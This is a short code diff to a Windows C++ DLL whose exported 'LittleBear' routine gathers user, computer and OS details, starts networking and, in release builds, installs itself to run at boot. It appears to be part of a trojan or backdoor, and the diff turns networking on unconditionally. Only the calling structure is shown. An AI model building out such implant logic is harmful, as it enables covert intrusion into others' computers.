@@ -48,17 +48,6 @@ using namespace std;
 
 
 
-//#define TEST_NETWORK
-
-#define TEST_REBOOTUP
-
-int test() {
-
-	return 0;
-}
-
-
-
 
 extern "C" __declspec(dllexport) int __stdcall LittleBear()
 {
@@ -96,8 +85,6 @@ extern "C" __declspec(dllexport) int __stdcall LittleBear()
 
 	iRet = furtherApi();
 
-	iRet = getUserAndServer();
-
 	//need to get computer info before write log file
 	iRet = GetUserAndComputerName(strUserName, strComputerName);
 	iCpuBits = GetOsBits();
@@ -109,9 +96,9 @@ extern "C" __declspec(dllexport) int __stdcall LittleBear()
 		writeLog("createDataPath error\r\n");
 		return FALSE;
 	}
-#ifdef TEST_NETWORK
+
 	iRet = networkInit();
-#endif
+
 #ifndef _DEBUG
 	iRet = setBoot(szSysDir, strPEResidence, iSystemVersion);
 #endif
